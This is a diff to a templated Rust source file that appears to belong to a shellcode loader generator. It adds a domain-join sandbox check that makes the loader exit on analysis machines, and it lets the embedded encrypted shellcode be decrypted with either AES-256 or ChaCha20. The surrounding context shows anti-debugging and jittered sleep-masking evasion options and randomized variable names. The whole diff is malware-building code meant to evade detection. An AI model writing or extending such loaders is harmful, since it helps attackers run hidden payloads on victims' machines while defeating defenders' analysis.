@@ -19,6 +19,9 @@ unsafe fn {{ v.fn_run }}() {
     {%- if "AntiDebug" in feature_names %}
     if scaffold::evasion::anti_debug::is_debugged() { return; }
     {%- endif %}
+    {%- if "SandboxDomain" in feature_names %}
+    if !scaffold::sandbox::domain::is_domain_joined() { return; }
+    {%- endif %}
     {%- if "SandboxUser" in feature_names %}
     if !scaffold::sandbox::usercheck::looks_real() { return; }
     {%- endif %}
@@ -48,9 +51,15 @@ unsafe fn {{ v.fn_run }}() {
     let {{ v.var_iv }}: [u8; 16] = [
         {%- for byte in config.iv_hex | hex_bytes %}{{ byte }},{% endfor %}
     ];
+    {%- if config.encryption == "Aes256" %}
     let {{ v.var_ptr }} = scaffold::crypto::decrypt_aes256(
         {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
     ).unwrap();
+    {%- else %}
+    let {{ v.var_ptr }} = scaffold::crypto::decrypt_chacha20(
+        {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
+    ).unwrap();
+    {%- endif %}
 
     {%- if "SleepEncrypt" in feature_names %}
     scaffold::evasion::sleep_mask::masked_sleep_jitter(3000);
